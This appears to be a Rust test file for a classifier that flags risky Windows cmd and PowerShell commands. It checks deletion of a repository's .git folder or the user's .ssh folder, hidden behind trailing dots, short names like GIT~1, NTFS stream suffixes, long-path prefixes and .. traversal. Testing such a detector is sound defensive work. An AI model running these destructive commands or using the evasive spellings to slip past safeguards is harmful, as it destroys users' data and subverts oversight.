            ("rd /s /q \".git \"", Rule::Delete),
            ("rd /s /q .git. .", Rule::Delete),
            ("rd /s /q .git\\objects.", Rule::Delete),
            ("rd /s /q C:\\Users\\me\\dev\\repo\\.git.", Rule::Delete),
            ("rd /s /q %USERPROFILE%\\.ssh.", Rule::Delete),
            ("rd /s /q src\\..\\.git.", Rule::Delete),
            ("rd /s /q src\\.. ", Rule::Delete),
            ("echo x > .git.\\config", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_short_name_can_be_the_repository_history() {
    // `.git` has the short name `GIT~1` (the dot is not kept). A short name
    // whose name part cannot be that of `.git`, or one not directly in the
    // workspace folder, is a plain name.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item PROGRA~1.txt",
            "Remove-Item -Recurse PROGRA~1",
            "Remove-Item -Recurse GI~1",
            "Remove-Item -Recurse GITX~",
            "Remove-Item -Recurse GIT~",
            "Remove-Item -Recurse GIT~1.txt",
            "Remove-Item -Recurse GIT~1a",
            "Remove-Item -Recurse GITIGN~1",
            "Remove-Item -Recurse GITHUB~1",
            "Remove-Item -Recurse GI3F2~1",
            "Remove-Item -Recurse GIZZZZ~1",
            "Remove-Item -Recurse src\\GIT~1",
        ],
        &[
            ("Remove-Item -Recurse -Force GIT~1", Rule::Delete),
            ("Remove-Item -Recurse -Force git~2", Rule::Delete),
            ("Remove-Item -Recurse -Force Git~10", Rule::Delete),
            ("Remove-Item -Recurse -Force GI3F2A~1", Rule::Delete),
            (
                "Remove-Item -Recurse -Force gi3f2a~12\\objects",
                Rule::Delete,
            ),
            ("Remove-Item -Recurse -Force GIT~1\\objects", Rule::Delete),
            ("Remove-Item -Recurse -Force GIT~1.", Rule::Delete),
            ("Remove-Item -Recurse -Force src\\..\\GIT~1", Rule::Delete),
            (
                "Remove-Item -Recurse -Force C:\\Users\\me\\dev\\repo\\GIT~1",
                Rule::Delete,
            ),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[
            "del PROGRA~1.txt",
            "rd /s /q PROGRA~1",
            "rd /s /q GI~1",
            "rd /s /q GIT~1.txt",
            "rd /s /q src\\GIT~1",
            "del /q build\\GIT~1.obj",
            "del /q GITHUB~1\\workflows\\ci.yml",
            "del .gitignore GITIGN~1",
        ],
        &[
            ("rd /s /q GIT~1", Rule::Delete),
            ("rd /s /q git~3", Rule::Delete),
            ("rd /s /q GI3F2A~1", Rule::Delete),
            ("del /s /q gi3f2a~1\\objects\\pack", Rule::Delete),
            ("rd /s /q GIT~1\\", Rule::Delete),
            ("del /s /q GIT~1\\objects\\pack", Rule::Delete),
            ("echo x > GIT~1\\config", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_stream_suffix_is_known_only_when_it_runs() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item C:\\Users\\me\\dev\\repo\\build",
            "Remove-Item FileSystem::.\\build -Recurse",
        ],
        &[
            (
                "Remove-Item -Recurse -Force .git::$INDEX_ALLOCATION",
                Rule::Delete,
            ),
            (
                "Remove-Item -Recurse -Force '.git:$I30:$INDEX_ALLOCATION'",
                Rule::Delete,
            ),
            ("Remove-Item notes.txt:stream", Rule::Delete),
            ("Remove-Item build\\notes.txt:stream", Rule::Delete),
            (
                "Remove-Item C:\\Users\\me\\dev\\repo\\notes.txt:stream",
                Rule::Delete,
            ),
            (
                "Set-Content -Path notes.txt:hidden -Value hi",
                Rule::Overwrite,
            ),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[
            "del C:\\Users\\me\\dev\\repo\\build\\x.obj",
            "rd /s /q C:\\Users\\me\\dev\\repo\\target",
        ],
        &[
            ("rd /s /q .git::$INDEX_ALLOCATION", Rule::Delete),
            ("rd /s /q .git:$I30:$INDEX_ALLOCATION", Rule::Delete),
            ("del notes.txt:stream", Rule::Delete),
            ("del build\\notes.txt:stream", Rule::Delete),
            (
                "del C:\\Users\\me\\dev\\repo\\notes.txt:stream",
                Rule::Delete,
            ),
            ("del \\\\server\\share\\notes.txt:stream", Rule::Delete),
            ("echo x > notes.txt:hidden", Rule::Overwrite),
        ],
    );
}

#[test]
fn a_windows_spelling_of_git_says_what_it_deletes() {
    for line in ["rd /s /q .git.", "rd /s /q \".git \"", "rd /s /q GIT~1"] {
        let found = classify(line, Shell::Cmd, &windows());
        assert_eq!(
            found.findings()[0].reason,
            "deletes the repository's history",
            "{line}"
        );
    }
    let found = classify("rd /s /q .git::$INDEX_ALLOCATION", Shell::Cmd, &windows());
    assert_eq!(
        found.findings()[0].reason,
        "deletes a path only known when it runs"
    );
}

#[test]
fn a_part_before_the_last_that_windows_may_trim_is_known_only_when_it_runs() {
    // Windows reads `.` and `..` first, then drops one trailing dot from a
    // part, and every dot and space only from the last. A part this does not
    // read to a name is known only when it runs.
    check(
        Shell::Cmd,
        &windows(),
        &[
            "rd /s /q src.\\build.",
            "del /q src\\.\\build\\x.obj",
            "del /q src\\..\\build\\x.obj.",
        ],
        &[
            ("rd /s /q .git\\...\\..\\objects", Rule::Delete),
            ("rd /s /q \".git\\. \\..\\objects\"", Rule::Delete),
            ("rd /s /q \".git\\refs\\.. \\..\\heads\"", Rule::Delete),
            ("rd /s /q \"C:\\Users\\me\\dev\\repo \\x\"", Rule::Delete),
            ("rd /s /q \"..\\repo.. \\x\"", Rule::Delete),
            ("rd /s /q \".\\.git .\\objects\"", Rule::Delete),
            ("rd /s /q \"src\\.. \\.git\"", Rule::Delete),
            ("rd /s /q \"x \\y\"", Rule::Delete),
            ("rd /s /q \"src\\.. \"", Rule::Delete),
            ("rd /s /q ....", Rule::Delete),
        ],
    );
    check(
        Shell::PowerShell,
        &windows(),
        &["Remove-Item src.\\build."],
        &[
            (
                "Remove-Item -Recurse -Force '.git\\...\\..\\objects'",
                Rule::Delete,
            ),
            (
                "Remove-Item -Recurse -Force '.git\\. \\..\\objects'",
                Rule::Delete,
            ),
            (
                "Remove-Item -Recurse -Force '.git\\refs\\.. \\..\\heads'",
                Rule::Delete,
            ),
            (
                "Remove-Item -Recurse -Force '.\\.git .\\objects'",
                Rule::Delete,
            ),
            ("Remove-Item -Recurse -Force 'src\\.. \\.git'", Rule::Delete),
            (
                "Remove-Item -Recurse 'C:\\Users\\me\\dev\\repo \\x'",
                Rule::Delete,
            ),
        ],
    );
    // From a working directory inside `.git`.
    let inside = Paths::new(
        "C:\\Users\\me\\dev\\repo\\.git\\hooks",
        "C:\\Users\\me",
        ["C:\\Users\\me\\dev\\repo"],
    );
    check(
        Shell::Cmd,
        &inside,
        &[],
        &[
            ("rd /s /q ...\\..\\..\\objects", Rule::Delete),
            ("rd /s /q ..\\objects", Rule::Delete),
        ],
    );
}

#[test]
fn windows_trims_only_the_spaces_it_knows() {
    // A non-breaking space (U+00A0) or an ideographic one (U+3000) is part of
    // a name to Windows, so these are plain names.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item -Recurse -Force '.git\u{a0}'",
            "Remove-Item -Recurse -Force '.git\u{3000}'",
            "Remove-Item -Recurse -Force '.git\u{a0}\\objects'",
        ],
        &[],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[
            "rd /s /q \".git\u{a0}\"",
            "rd /s /q \".git\u{3000}\"",
            "rd /s /q \".git\u{3000}.\"",
        ],
        &[],
    );
}

#[test]
fn a_long_path_prefix_is_outside_the_workspace() {
    // `\\?\` is read as a share, which is outside: risky, as it was.
    check(
        Shell::Cmd,
        &windows(),
        &[],
        &[
            (
                "rd /s /q \\\\?\\C:\\Users\\me\\dev\\repo\\.git.",
                Rule::Delete,
            ),
            (
                "rd /s /q \\\\?\\C:\\Users\\me\\dev\\repo\\GIT~1",
                Rule::Delete,
            ),
        ],
    );
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[(
            "Remove-Item -Recurse -Force '\\\\?\\C:\\Users\\me\\dev\\repo\\.git.'",
            Rule::Delete,
        )],
    );
}
